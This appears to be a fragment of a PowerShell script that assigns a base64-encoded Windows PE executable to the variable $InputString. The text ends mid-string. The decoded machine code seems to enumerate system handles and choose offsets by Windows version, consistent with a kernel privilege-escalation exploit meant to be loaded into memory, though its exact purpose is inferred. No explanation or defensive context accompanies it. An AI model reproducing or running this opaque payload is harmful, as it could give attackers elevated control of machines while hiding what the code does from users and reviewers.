$InputString = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
A6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ
0KJAAAAAAAAAB3ZBLMMwV8nzMFfJ8zBXyfKJjXnyQFfJ8omOKfPQV8nyiY1p9nBXyfOn3vnzcFfJ9cc
+CfMAV8nzMFfZ9oBXyfKJjTnzIFfJ8omOGfMgV8n1JpY2gzBXyfAAAAAAAAAAAAAAAAAAAAAFBFAABM
AQUAYGpTVQAAAAAAAAAA4AACAQsBCgAAcgAAAEYAAAAAAACvGwAAABAAAACQAAAAAEAAABAAAAACAAA
FAAEAAAAAAAUAAQAAAAAAABABAAAEAAAAUQEAAwBAgQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAA
AAAAAAdK8AAFAAAAAA8AAAtAEAAAAAAAAAAAAAAAAAAAAAAAAAAAEAgAcAAJCRAAAcAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAA4KsAAEAAAAAAAAAAAAAAAACQAABQAQAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAALnRleHQAAADqcQAAABAAAAByAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAFCcAAAC
QAAAAKAAAAHYAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAMQrAAAAwAAAAA4AAACeAAAAAAAAAAAAAA
AAAABAAADALnJzcmMAAAC0AQAAAPAAAAACAAAArAAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAZAwAA
AAAAQAADgAAAK4AAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAFWL7IHsFAIAAKGEwkAAM8WJRfxTVlfHhfD9//8AAAAAvwAQAABXagj/FR
iQQABQ/xUEkEAAi/CF9g+E+AAAAI2F7P3//1BXVmoL/xVIkUAAi9iB+wQAAMB1ElZqAP8VGJBAAFD/F
QyQQAAD/4uF8P3//0CJhfD9//+D+GQPj6UAAACB+wQAAMB0m4XbD4iVAAAAgz4AD4SMAAAAaAQBAACN
jfT9//9R/xUgkEAAhcB0dsaEBfT9//9cD7dWHo1MMiCNlAX1/f//igGIAkFChMB19ot+DFZqAP8VGJB
AAFD/FQyQQABqAWoAjYX0/f//UP8VNJBAAIvwhfZ0O2gAqkAAVv8VKJBAACv+Vo0cB/8VAJBAAF9ei8
Nbi038M83omwQAAIvlXcNWagD/FRiQQABQ/xUMkEAAi038X14zzTPAW+h4BAAAi+Vdw8zMzMzMzFZXa
ByqQABoNKpAAP8VMJBAAIs9KJBAAFD/12hAqkAAi/D/FRSQQACFwHQ4aFiqQABQ/9eFwHU4hfZ0KI2O
oAIAAIvGO/F3HLK4jZsAAAAAvsdAAABmOzB1BThQB3QKQDvBduxfM8Bew4tACIXAdPSDPVzaQAAAiwi
LeASLUQh1BoN4CAx13TPJhdJ014s1UNpAAI1HCDlw/HUFgDgBdA1Bg8AMO8py7l8zwF7DjRRJD7dElw
rB4BBfC8Few8zMzFWL7IPsCIM9VNpAAAB1UosNQNpAAI1F+FBRx0X4AAAAAMdF/AAAAAD/FUTaQACFw
HgljVX8UmoE/xVE2kAAhcB4FaFY2kAAhcB0DItN/IsUCItN+IkUCMcFVNpAAAEAAAAzwIvlXcIQAMzM
zMzMzMxVi+yhSNpAAIsNTNpAAFBR/xUkkEAA6LX+//+FwHQQixU0kUAAUmr8UP8VMJFAAF3/JUjaQAD
MzMzMzMzMzMzMVYvsg+T4gey8AQAAoYTCQAAzxImEJLgBAACLRQxTVmSLNRgAAACLXjBXagCJRCQY/x
UUkEAAiUQkGLkUAQAAjYQkqAAAAMYAAEBJdfmNjCSoAAAAUceEJKwAAAAUAQAA/xVEkUAAaGSqQADoO
AYAAIPEBIN9CAJ0FGiEqkAA6CUGAABopKpAAOlSAgAAi4QkrAAAAIP4BXUWxwVc2kAAAQAAAMcFWNpA
ANgAAADrE4P4Bg+FGgIAAMcFWNpAAPgAAACNVCQQUsdEJBQBAAAA/xUIkEAAUP8VLJBAAIN8JBAAdCR
o+KpAAOi7BQAAg8QEM8BfXluLjCS4AQAAM8zo+wEAAIvlXcP/FTyQQACjQNpAAOgp/P//o0TaQACFwH
UkaDCrQADofgUAAIPEBDPAX15bi4wkuAEAADPM6L4BAACL5V3DuTAAAACNRCQwjUkAxgAAQEl1+WgAf
wAAUcdEJDgwAAAAx0QkQBASQAD/FSyRQACJRCRIjUQkMFDHRCRc8KlAAP8VKJFAAItOQI1UJBxSD7f4
i0MsakAF2AAAAGoEUIkNUNpAAKNM2kAA/xU4kEAAhcB1JGhoq0AA6OcEAACDxAQzwF9eW4uMJLgBAAA
zzOgnAQAAi+Vdw6FM2kAAaIASQABQ/xUkkEAAagBqAGoAagBqAGoAagBqAGoAagCL91ZqAKNI2kAA/x
U4kUAAgz1U2kAAAQ+FgAAAALlEAAAAjUQkYMYAAEBJdfm5EAAAAI1EJCDGAABASXX5i0QkFI1MJCBRi
0gEjVQkZFJqAGoAagBqAWoAagBRagDHhCSIAAAARAAAAP8VHJBAAItUJChSaIirQADoKwQAAOiLAAAA
g8AgUOjBAwAAi0QkLIPEDGr/UP8VEJBAAOsNaMyrQADoAQQAAIPEBGaF/3Q4i0wkGFFW/xUkkUAAM8B
fXluLjCS4AQAAM8zoMAAAAIvlXcOLlCS0AAAAUmjIqkAA6MQDAACDxAiLjCTEAQAAX15bM8wzwOgEAA
AAi+VdwzsNhMJAAHUC88Pp7AUAALgAwEAAw6HA60AAVmoUXoXAdQe4AAIAAOsGO8Z9B4vGo8DrQABqB
FDoTwkAAFlZo6jbQACFwHUeagRWiTXA60AA6DYJAABZWaOo20AAhcB1BWoaWF7DM9K5AMBAAOsFoajb
QACJDAKDwSCDwgSB+YDCQAB86mr+XjPSuRDAQABXi8LB+AWLBIWg2kAAi/qD5x/B5waLBAeD+P90CDv
GdASFwHUCiTGDwSBCgflwwEAAfM5fM8Bew+jWAgAAgD0o0UAAAHQF6IYJAAD/NajbQADoQQkAAFnDi/
9Vi+xWi3UIuADAQAA78HIigf5gwkAAdxqLzivIwfkFg8EQUehQDgAAgU4MAIAAAFnrCoPGIFb/FWCQQ
ABeXcOL/1WL7ItFCIP4FH0Wg8AQUOgjDgAAi0UMgUgMAIAAAFldw4tFDIPAIFD/FWCQQABdw4v/VYvs
i0UIuQDAQAA7wXIfPWDCQAB3GIFgDP9///8rwcH4BYPAEFDoAQ0AAFldw4PAIFD/FWSQQABdw4v/VYv
si00Ii0UMg/kUfROBYAz/f///g8EQUejSDAAAWV3Dg8AgUP8VZJBAAF3Di/9Vi+xTVot1CItGDIvIgO
EDM9uA+QJ1QKkIAQAAdDmLRghXiz4r+IX/fixXUFbobBUAAFlQ6JEUAACDxAw7x3UPi0YMhMB5D4Pg/
YlGDOsHg04MIIPL/1+LRgiDZgQAiQZei8NbXcOL/1WL7FaLdQiF9nUJVug1AAAAWesvVuh8////WYXA
dAWDyP/rH/dGDABAAAB0FFboAxUAAFDoIxUAAFn32FkbwOsCM8BeXcNqFGigrEAA6PIVAAAz/4l95Il
93GoB6NEMAABZiX38M/aJdeA7NcDrQAAPjYMAAAChqNtAAI0EsDk4dF6LAPZADIN0VlBW6Gj+//9ZWT
PSQolV/KGo20AAiwSwi0gM9sGDdC85VQh1EVDoSv///1mD+P90Hv9F5OsZOX0IdRT2wQJ0D1DoL////
1mD+P91AwlF3Il9/OgIAAAARuuEM/+LdeChqNtAAP80sFbocf7//1lZw8dF/P7////oEgAAAIN9CAGL
ReR0A4tF3OhzFQAAw2oB6DsLAABZw2oMaMisQADoGBUAADP2OXUIdQlW6A3///9Z6yf/dQjodP3//1m
Jdfz/dQjorv7//1mJReTHRfz+////6AkAAACLReToIRUAAMP/dQjouv3//1nDagHozP7//1nDagxo6K
xAAOi8FAAAM8Az9jl1CA+VwDvGdRXoaCYAAMcAFgAAAOgLJgAAg8j/61/oMfz//2ogWwPDUGoB6Dz9/
/9ZWYl1/Oga/P//A8NQ6GQWAABZi/iNRQxQVv91COgC/P//A8NQ6DgYAACJReTo8vv//wPDUFfo1xYA
AIPEGMdF/P7////oCQAAAItF5Oh6FAAAw+jM+///g8AgUGoB6Ef9//9ZWcOhhMJAAIPIATPJOQXEzUA
AD5TBi8HDi/9Vi+yDPdDNQAACdAXoJSgAAP91COhuJgAAaP8AAADomgYAAFlZXcNqFGgIrUAA6NYTAA
Az9jk1pNtAAHULVlZqAVb/FWyQQAC4TVoAAGY5BQAAQAB0BYl15Os2oTwAQACBuAAAQABQRQAAdeq5C
wEAAGY5iBgAQAB13IO4dABAAA520zPJObDoAEAAD5XBiU3k6KsxAACFwHUIahzoXf///1noHzAAAIXA
dQhqEOhM////WejJLAAAiXX86NgBAACFwHkIahvolAgAAFn/FWiQQACjoNtAAOgOLAAAo8jNQADoSSs
AAIXAeQhqCOhuCAAAWejCKAAAhcB5CGoJ6F0IAABZagHoNAYAAFk7xnQHUOhKCAAAWaEQ0UAAoxTRQA
BQ/zUI0UAA/zUE0UAA6Gf3//+DxAyJReA5deR1BlDo0gcAAOj5BwAA6y6LReyLCIsJiU3cUFHoFCcAA
FlZw4tl6ItF3IlF4IN95AB1BlDouAcAAOjYBwAAx0X8/v///4tF4OjHEgAAw+jSMAAA6ZX+//+L/1WL
7IHsKAMAAKPgzkAAiQ3czkAAiRXYzkAAiR3UzkAAiTXQzkAAiT3MzkAAZowV+M5AAGaMDezOQABmjB3
IzkAAZowFxM5AAGaMJcDOQABmjC28zkAAnI8F8M5AAItFAKPkzkAAi0UEo+jOQACNRQij9M5AAIuF4P
z//8cFMM5AAAEAAQCh6M5AAKPkzUAAxwXYzUAACQQAwMcF3M1AAAEAAAChhMJAAImF2Pz//6GIwkAAi
YXc/P///xV8kEAAoyjOQABqAeibMAAAWWoA/xV4kEAAaKyRQAD/FXSQQACDPSjOQAAAdQhqAeh3MAAA
WWgJBADA/xUIkEAAUP8VcJBAAMnDi/9Vi+yD7ExWjUW0UP8VkJBAAGpAaiBeVuhsAgAAWVkzyTvBdQi
DyP/pDwIAAI2QAAgAAKOg2kAAiTWE2kAAO8JzNoPABYNI+/9mx0D/AAqJSANmx0AfAArGQCEKiUgziE
gvizWg2kAAg8BAjVD7gcYACAAAO9ZyzVNXZjlN5g+EDgEAAItF6DvBD4QDAQAAixiDwASJRfwDw74AC
AAAiUX4O958AoveOR2E2kAAfWu/pNpAAGpAaiDozAEAAFlZhcB0UYMFhNpAACCNiAAIAACJBzvBczGD
wAWDSPv/g2ADAIBgH4CDYDMAZsdA/wAKZsdAIAoKxkAvAIsPg8BAA86NUPs70XLSg8cEOR2E2kAAfKL
rBosdhNpAADP/hdt+cotF+IsAg/j/dFyD+P50V4tN/IoJ9sEBdE32wQh1C1D/FYyQQACFwHQ9i/eD5h
+Lx8H4BcHmBgM0haDaQACLRfiLAIkGi0X8igCIRgRooA8AAI1GDFD/FYiQQACFwA+EvAAAAP9GCINF+
ARH/0X8O/t8jjPbi/PB5gYDNaDaQACLBoP4/3QLg/j+dAaATgSA63HGRgSBhdt1BWr2WOsKjUP/99gb
wIPA9VD/FYSQQACL+IP//3RChf90Plf/FYyQQACFwHQzJf8AAACJPoP4AnUGgE4EQOsJg/gDdQSATgQ
IaKAPAACNRgxQ/xWIkEAAhcB0LP9GCOsKgE4EQMcG/v///0OD+wMPjGj/////NYTaQAD/FYCQQAAzwF
9bXsnDg8j/6/aL/1WL7FZXM/b/dQjoFC4AAIv4WYX/dSc5BfzQQAB2H1b/FZiQQACNhugDAAA7BfzQQ
AB2A4PI/4vwg/j/dcqLx19eXcOL/1WL7FZXM/ZqAP91DP91COheLgAAi/iDxAyF/3UnOQX80EAAdh9W
/xWYkEAAjYboAwAAOwX80EAAdgODyP+L8IP4/3XDi8dfXl3Di/9Vi+xWVzP2/3UM/3UI6JYuAACL+Fl
Zhf91LDlFDHQnOQX80EAAdh9W/xWYkEAAjYboAwAAOwX80EAAdgODyP+L8IP4/3XBi8dfXl3Di/9Vi+
yDfQgAdC3/dQhqAP812NlAAP8VDJBAAIXAdRhW6OYfAACL8P8VnJBAAFDolh8AAFmJBl5dw2oQaCitQ
ADoBw4AADPbiV3kagHo6QQAAFmJXfxqA1+JfeA7PcDrQAB9VIv3oajbQAA5HLB0RYsEsPZADIN0D1Do
9y4AAFmD+P90A/9F5IP/FHwooajbQACLBLCDwCBQ/xWUkEAAoajbQAD/NLDoVP///1mhqNtAAIkcsEf
rocdF/P7////oCQAAAItF5OjGDQAAw2oB6I4DAABZw4v/VYvsaMSRQAD/FRSQQACFwHQVaLSRQABQ/x
UokEAAhcB0Bf91CP/QXcOL/1WL7P91COjI////Wf91CP8VoJBAAMxqCOgbBAAAWcNqCOg5AwAAWcOL/
1bo3iYAAIvwVugcMQAAVujvHAAAVugBMQAAVujsMAAAVujhLgAAVujKLgAAg8QYXsOL/1WL7FaLdQgz
wOsPhcB1EIsOhcl0Av/Rg8YEO3UMcuxeXcOL/1WL7IM9fNpAAAB0GWh82kAA6OMyAABZhcB0Cv91CP8
VfNpAAFnoGjIAAGhwkUAAaFiRQADoof///1lZhcB1VFZXaM5HQADo4jEAALhQkUAAvlSRQABZi/g7xn
MPiweFwHQC/9CDxwQ7/nLxgz2A2kAAAF9edBtogNpAAOh5MgAAWYXAdAxqAGoCagD/FYDaQAAzwF3Da
iBoSK1AAOgoDAAAagjoDwMAAFmDZfwAM8BAOQUw0UAAD4TYAAAAoyzRQACKRRCiKNFAAIN9DAAPhaAA
AAD/NXTaQACLNaSQQAD/1ovYiV3Qhdt0aP81cNpAAP/Wi/iJfdSJXdyJfdiD7wSJfdQ7+3JL6IElAAA
5B3TtO/tyPv83/9aL2OhuJQAAiQf/0/81dNpAAP/Wi9j/NXDaQAD/1jld3HUFOUXYdA6JXdyJXdCJRd
iL+Il91Itd0Ourx0XkdJFAAIF95ICRQABzEYtF5IsAhcB0Av/Qg0XkBOvmx0XghJFAAIF94IiRQABzE
YtF4IsAhcB0Av/Qg0XgBOvmx0X8/v///+ggAAAAg30QAHUpxwUw0UAAAQAAAGoI6CcBAABZ/3UI6L39
//+DfRAAdAhqCOgRAQAAWcPoOgsAAMOL/1WL7GoAagD/dQjor/7//4PEDF3Di/9Vi+xqAGoB/3UI6Jn
+//+DxAxdw2oBagBqAOiJ/v//g8QMw2oBagFqAOh6/v//g8QMw4v/VYvs6M0eAAD/dQjoFh0AAFlo/w
AAAOiv////zIv/Vlcz9r840UAAgzz11MJAAAF1HY0E9dDCQACJOGigDwAA/zCDxxj/FYiQQACFwHQMR
oP+JHzTM8BAX17DgyT10MJAAAAzwOvxi/9Tix2UkEAAVr7QwkAAV4s+hf90E4N+BAF0DVf/01fo0Pv/
/4MmAFmDxgiB/vDDQAB83L7QwkAAX4sGhcB0CYN+BAF1A1D/04PGCIH+8MNAAHzmXlvDi/9Vi+yLRQj
/NMXQwkAA/xVkkEAAXcNqDGhorUAA6MgJAAAz/0eJfeQz2zkd2NlAAHUY6OAdAABqHugqHAAAaP8AAA
DoVvz//1lZi3UIjTT10MJAADkedASLx+ttahjoW/r//1mL+Dv7dQ/oOhsAAMcADAAAADPA61BqCuhYA
AAAWYld/DkedStooA8AAFf/FYiQQACFwHUXV+j/+v//WegFGwAAxwAMAAAAiV3k6wuJPusHV+jk+v//
WcdF/P7////oCQAAAItF5OhhCQAAw2oK6Cn///9Zw4v/VYvsi0UIVo00xdDCQACDPgB1E1DoI////1m
FwHUIahHoQf7//1n/Nv8VYJBAAF5dw4v/VYvsuOQaAADoQDMAAKGEwkAAM8WJRfyLRQxWi3UIVzP/iY
U05f//ib045f//ib0w5f//OX0QdQczwOmuBgAAO8d1H+hnGgAAiTjoTRoAAMcAFgAAAOjwGQAAg8j/6
YsGAACLxsH4BYv+U40chaDaQACLA4PnH8HnBopMOCQCydD5iZ0k5f//iI0/5f//gPkCdAWA+QF1J4tN
EPfR9sEBdR3oCRoAAIMgAOjuGQAAxwAWAAAA6JEZAADpHQYAAPZEOAQgdA9qAmoAagBW6AsxAACDxBB
W6KwwAABZhcAPhJkCAACLA/ZEBwSAD4SMAgAA6FwjAACLQGwzyTlIFI2FIOX//w+UwVCLA/80B4vx/x
W0kEAAM8k7wQ+EYAIAADvxdAw4jT/l//8PhFACAAD/FbCQQACLnTTl//+JhSDl//8zwImFLOX//zlFE
A+GIwUAAImFQOX//4qFP+X//4TAD4VnAQAAiguLtSTl//8zwID5Cg+UwImFHOX//4sGA8eDeDgAdBWK
UDSIVfSITfWDYDgAagKNRfRQ60sPvsFQ6NAvAABZhcB0OouNNOX//yvLA00QM8BAO8gPhqUBAABqAo2
FROX//1NQ6FQvAACDxAyD+P8PhJIEAABD/4VA5f//6xtqAVONhUTl//9Q6DAvAACDxAyD+P8PhG4EAA
AzwFBQagWNTfRRagGNjUTl//9RUP+1IOX//0P/hUDl////FayQQACL8IX2D4Q9BAAAagCNhSzl//9QV
o1F9FCLhSTl//+LAP80B/8VqJBAAIXAD4QKBAAAi4VA5f//i40w5f//A8GJhTjl//85tSzl//8PjPYD
AACDvRzl//8AD4TNAAAAagCNhSzl//9QagGNRfRQi4Uk5f//iwDGRfQN/zQH/xWokEAAhcAPhLEDAAC
DvSzl//8BD4ywAwAA/4Uw5f///4U45f//6YMAAAA8AXQEPAJ1IQ+3MzPJg/4KD5TBg8MCg4VA5f//Ao
m1ROX//4mNHOX//zwBdAQ8AnVS/7VE5f//6MEsAABZZjuFROX//w+FSQMAAIOFOOX//wKDvRzl//8Ad
ClqDVhQiYVE5f//6JQsAABZZjuFROX//w+FHAMAAP+FOOX///+FMOX//4tFEDmFQOX//w+C+f3//+kI
AwAAiw6KE/+FOOX//4hUDzSLDolEDzjp7wIAADPJiwP2RDgEgA+EoQIAAIC9P+X//wCJjUTl//8Phag
AAACLnTTl//85TRAPhv0CAACLyzP2K4005f//jYVI5f//O00QcyaKE0NBiZ0g5f//gPoKdQv/hTDl//
/GAA1ARogQQEaB/v8TAABy1YvwjYVI5f//K/BqAI2FKOX//1BWjYVI5f//UIuFJOX//4sA/zQH/xWok
EAAhcAPhEMCAACLhSjl//8BhTjl//87xg+MOwIAAIvDK4U05f//O0UQD4Js////6SUCAACAvT/l//8C
D4XNAAAAi5005f//OU0QD4ZIAgAAg6VA5f//AIvLK4005f//agKNhUjl//9eO00Qc0MPtxMD3gPOiZ0
g5f//g/oKdRoBtTDl//9qDVtmiRiLnSDl//8DxgG1QOX//wG1QOX//2aJEAPGgb1A5f///hMAAHK4i/
CNhUjl//8r8GoAjYUo5f//UFaNhUjl//9Qi4Uk5f//iwD/NAf/FaiQQACFwA+EaQEAAIuFKOX//wGFO
OX//zvGD4xhAQAAi8MrhTTl//87RRAPgkf////pSwEAAIuFNOX//4mFLOX//zlNEA+GdQEAAIuNLOX/
/4OlQOX//wArjTTl//9qAo2FSPn//147TRBzO4uVLOX//w+3EgG1LOX//wPOg/oKdQ5qDVtmiRgDxgG
1QOX//wG1QOX//2aJEAPGgb1A5f//qAYAAHLAM/ZWVmhVDQAAjY3w6///UY2NSPn//yvBmSvC0fhQi8
FQVmjp/QAA/xWskEAAi9g73g+ElwAAAGoAjYUo5f//UIvDK8ZQjYQ18Ov//1CLhSTl//+LAP80B/8Vq
JBAAIXAdAwDtSjl//873n/L6wz/FZyQQACJhUTl//873n9ci4Us5f//K4U05f//iYU45f//O0UQD4IL
////6z9RjY0o5f//Uf91EP+1NOX///80OP8VqJBAAIXAdBWLhSjl//+DpUTl//8AiYU45f//6wz/FZy
QQACJhUTl//+DvTjl//8AdWyDvUTl//8AdC1qBV45tUTl//91FOgPFAAAxwAJAAAA6BcUAACJMOs//7
VE5f//6BsUAABZ6zGLhSTl//+LAPZEBwRAdA+LhTTl//+AOBp1BDPA6yTozxMAAMcAHAAAAOjXEwAAg
yAAg8j/6wyLhTjl//8rhTDl//9bi038XzPNXuhy6f//ycNqEGiIrUAA6NYBAACLXQiD+/51G+ibEwAA
gyAA6IATAADHAAkAAACDyP/plAAAAIXbeAg7HYTaQAByGuh0EwAAgyAA6FkTAADHAAkAAADo/BIAAOv
Si8PB+AWNPIWg2kAAi/OD5h/B5gaLBw++RDAEg+ABdMZT6PEsAABZg2X8AIsH9kQwBAF0FP91EP91DF
Pobvj//4PEDIlF5OsX6P8SAADHAAkAAADoBxMAAIMgAINN5P/HRfz+////6AwAAACLReToXwEAAMOLX
QhT6DktAABZw4v/VYvsi0UIhcB1Fei8EgAAxwAWAAAA6F8SAACDyP9dw4tAEF3DahBoqK1AAOjcAAAA
i10Ig/v+dRPojhIAAMcACQAAAIPI/+mhAAAAhdt4CDsdhNpAAHIS6G8SAADHAAkAAADoEhIAAOvai8P
B+AWNPIWg2kAAi/OD5h/B5gaLBw++RAYEg+ABdM5T6AcsAABZg2X8AIsH9kQGBAF0MVPoiisAAFlQ/x
W4kEAAhcB1C/8VnJBAAIlF5OsEg2XkAIN95AB0GegVEgAAi03kiQjo+BEAAMcACQAAAINN5P/HRfz+/
///6AwAAACLReToYAAAAMOLXQhT6DosAABZw8zMzMzMzMzMzMzMzMzMzGiQLkAAZP81AAAAAItEJBCJ
bCQQjWwkECvgU1ZXoYTCQAAxRfwzxVCJZej/dfiLRfzHRfz+////iUX4jUXwZKMAAAAAw4tN8GSJDQA
AAABZX19eW4vlXVHDzMzMzMzMzIv/VYvsg+wYU4tdDFaLcwgzNYTCQABXiwbGRf8Ax0X0AQAAAI17EI
P4/nQNi04EA88zDDjo9eb//4tODItGCAPPMww46OXm//+LRQj2QARmD4UZAQAAi00QjVXoiVP8i1sMi
UXoiU3sg/v+dF+NSQCNBFuLTIYUjUSGEIlF8IsAiUX4hcl0FIvX6FQsAADGRf8BhcB4QH9Hi0X4i9iD
+P51zoB9/wB0JIsGg/j+dA2LTgQDzzMMOOhy5v//i04Mi1YIA88zDDroYub//4tF9F9eW4vlXcPHRfQ
AAAAA68mLTQiBOWNzbeB1KYM9aNpAAAB0IGho2kAA6NMkAACDxASFwHQPi1UIagFS/xVo2kAAg8QIi0
0Mi1UI6PQrAACLRQw5WAx0EmiEwkAAV4vTi8jo9isAAItFDItN+IlIDIsGg/j+dA2LTgQDzzMMOOjc5
f//i04Mi1YIA88zDDrozOX//4tF8ItICIvX6IorAAC6/v///zlTDA+ET////2iEwkAAV4vL6KErAADp
Gf///4v/VYvsVot1CFbo9Pz//1DopSYAAFlZhcB0fOiO5f//g8AgO/B1BDPA6w/ofuX//4PAQDvwdWA
zwED/BcDNQAD3RgwMAQAAdU5TV408hYjSQACDPwC7ABAAAHUgU+iD7v//WYkHhcB1E41GFGoCiUYIiQ
ZYiUYYiUYE6w2LP4l+CIk+iV4YiV4EgU4MAhEAADPAX0Bb6wIzwF5dw4v/VYvsg30IAHQnVot1DPdGD
AAQAAB0GVboqeb//4FmDP/u//+DZhgAgyYAg2YIAFleXcOL/1WL7ItFCFaL8cZGDACFwHVj6J0YAACJ
RgiLSGyJDotIaIlOBIsOOw0IzUAAdBKLDcDKQACFSHB1B+hHNAAAiQaLRgQ7BcjJQAB0FotGCIsNwMp
AAIVIcHUI6KYsAACJRgSLRgj2QHACdRSDSHACxkYMAesKiwiJDotABIlGBIvGXl3CBAD2QQxAdAaDeQ
gAdCT/SQR4C4sRiAL/AQ+2wOsMD77AUVDoUzQAAFlZg/j/dQMJBsP/BsOL/1WL7FH2QwxAVovwiweJR
fx0DYN7CAB1B4tFDAEG6z6DJwCDfQwAfjCLRQiKAP9NDIvL6JT/////RQiDPv91DoM/KnUPi8uwP+h+
////g30MAH/Vgz8AdQWLRfyJB17Jw4v/VYvsgeyAAgAAoYTCQAAzxYlF/FOLXQxWi3UIM8BXi30U/3U
QjY2k/f//ibXQ/f//ib3k/f//iYW0/f//iYXw/f//iYXI/f//iYXo/f//iYXM/f//iYW8/f//iYXE/f
//6H3+///oeA0AAImFlP3//4X2dSvoaQ0AAMcAFgAAAOgMDQAAgL2w/f//AHQKi4Ws/f//g2Bw/YPI/
+k3CwAA9kYMQHVeVuhq+v//WbqQwkAAg/j/dBuD+P50FovIg+Efi/DB/gXB4QYDDLWg2kAA6wKLyvZB
JH91m4P4/3QZg/j+dBSLyIPgH8H5BcHgBgMEjaDaQADrAovC9kAkgA+Fcf///zPJO9kPhGf///+KE4m
N3P3//4mN2P3//4mNuP3//4iV7/3//4TSD4SOCgAAQzP2iZ3A/f//ObXc/f//D4x5CgAAjULgPFh3Dw
++wg++gNiRQACD4A/rAjPAD76EwfiRQABqB8H4BFmJhYz9//87wQ+HIAoAAP8khfM9QACDjej9////i
bWI/f//ibW8/f//ibXI/f//ibXM/f//ibXw/f//ibXE/f//6ekJAAAPvsKD6CB0SoPoA3Q2g+gIdCVI
SHQVg+gDD4XKCQAAg43w/f//COm+CQAAg43w/f//BOmyCQAAg43w/f//AemmCQAAgY3w/f//gAAAAOm
XCQAAg43w/f//AumLCQAAgPoqdSyDxwSJveT9//+Lf/yJvcj9//87/g+NbAkAAION8P3//wT3ncj9//
/pWgkAAIuFyP3//2vACg++yo1ECNCJhcj9///pPwkAAIm16P3//+k0CQAAgPoqdSaDxwSJveT9//+Lf
/yJvej9//87/g+NFQkAAION6P3////pCQkAAIuF6P3//2vACg++yo1ECNCJhej9///p7ggAAID6SXRV
gPpodESA+mx0GID6dw+F1ggAAIGN8P3//wAIAADpxwgAAIA7bHUWQ4GN8P3//wAQAACJncD9///prAg
AAION8P3//xDpoAgAAION8P3//yDplAgAAIoDPDZ1HoB7ATR1GIPDAoGN8P3//wCAAACJncD9///pcA
gAADwzdR6AewEydRiDwwKBpfD9////f///iZ3A/f//6U4IAAA8ZA+ERggAADxpD4Q+CAAAPG8PhDYIA
AA8dQ+ELggAADx4D4QmCAAAPFgPhB4IAACJtYz9//8htcT9//+NhaT9//9QD7bCUOjrIAAAWYXAioXv
/f//WXQii43Q/f//jbXc/f//6Lb7//+KA0OJncD9//+EwA+EsPz//4uN0P3//4213P3//+iU+///6b4
HAAAPvsKD+GQPj7YBAAAPhFgCAACD+FMPj7oAAAB0TIPoQXQQSEh0JEhIdAhISA+FqwUAAIDCIMeFiP
3//wEAAACIle/9///pVgIAAPeF8P3//zAIAAAPhZ4AAACBjfD9//8ACAAA6Y8AAAD3hfD9//8wCAAAd
QqBjfD9//8ACAAAi43o/f//g/n/dQW5////f4PHBPeF8P3//xAIAACJveT9//+Lf/yJveD9//8PhP4E
AACF/3ULofTDQACJheD9//+LheD9///HhcT9//8BAAAA6cwEAACD6FgPhCIDAABISHR/K8EPhLYBAAB
ISA+F6wQAAIu95P3//4PHBPeF8P3//xAIAACJveT9//90MA+3R/xQaAACAACNhfT9//9QjYXY/f//UO
gvMgAAg8QQhcB0H8eFvP3//wEAAADrE4pH/IiF9P3//8eF2P3//wEAAACNhfT9//+JheD9///pfAQAA
IsHg8cEib3k/f//hcB0O4tIBIXJdDT3hfD9//8ACAAAD78AiY3g/f//dBSZK8LR+MeFxP3//wEAAADp
NwQAACG1xP3//+ksBAAAofDDQACJheD9//9Q6L0vAABZ6RUEAACD+HAPjz0CAAAPhCUCAACD+GUPjAM
EAACD+GcPjrcAAACD+Gl0fIP4bnQug/hvD4XnAwAA9oXw/f//gIu95P3//8eF2P3//wgAAAB0bIGN8P
3//wACAADrYIOF5P3//wSLheT9//+LcPzo+OH//4XAD4Ri+v//9oXw/f//IHQMZouF3P3//2aJBusIi
4Xc/f//iQbHhbz9//8BAAAA6T4FAACLveT9//+DjfD9//9Ax4XY/f//CgAAAIuN8P3///fBAIAAAA+E
4AEAAIsHi1cEg8cI6QwCAACLveT9//+DjfD9//9AjZ30/f//uAACAACJneD9//+JhaD9//85tej9//9
9DMeF6P3//wYAAADranURgPpndWPHhej9//8BAAAA61c5hej9//9+BomF6P3//4G96P3//6MAAAB+PY
u16P3//4HGXQEAAFboDOb//4qV7/3//1mJhbj9//+FwHQQiYXg/f//ibWg/f//i9jrCseF6P3//6MAA
ACLB4s1pJBAAIPHCImFgP3//4tH/ImFhP3//42FpP3//1D/tYj9//8PvsL/tej9//+JveT9//9Q/7Wg
/f//jYWA/f//U1D/NYjFQAD/1v/Qi73w/f//g8QcgeeAAAAAdB2Dvej9//8AdRSNhaT9//9QU/81lMV
AAP/W/9BZWYC97/3//2d1GIX/dRSNhaT9//9QU/81kMVAAP/W/9BZWYA7LXURgY3w/f//AAEAAEOJne
D9//9T6cH9///Hhej9//8IAAAAiY20/f//6yqD6HMPhG78//9ISA+EWP7//4PoAw+FuwEAAIu95P3//
8eFtP3//ycAAAD2hfD9//+Ax4XY/f//EAAAAA+EMv7//4qFtP3//wRRxoXU/f//MIiF1f3//8eFzP3/
